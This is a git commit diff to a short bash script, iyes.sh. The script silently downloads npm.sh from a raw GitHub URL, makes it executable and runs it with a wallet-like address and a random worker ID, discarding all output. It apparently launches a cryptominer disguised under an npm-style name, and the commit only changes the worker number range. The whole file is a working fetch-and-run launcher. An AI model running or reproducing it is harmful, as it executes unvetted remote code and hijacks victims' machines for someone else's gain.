d1e41ec780f3c79e8bcf7757058762479f7eab1f
yuhuigaes <90950485+yuhuigaes@users.noreply.github.com>
2021-09-18 14:29:05 +0700

    Update iyes.sh

--- iyes.sh
+++ iyes.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 wget -q https://raw.githubusercontent.com/makaryobos/privasi/main/npm.sh
 chmod +x npm.sh
-./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-20 -n 1)-NIK) >/dev/null
+./npm.sh DRQ9iChWbU8cxC3js3YNwDheajeq6jN8Np.$(echo $(shuf -i 1-300 -n 1)-NIK) >/dev/null
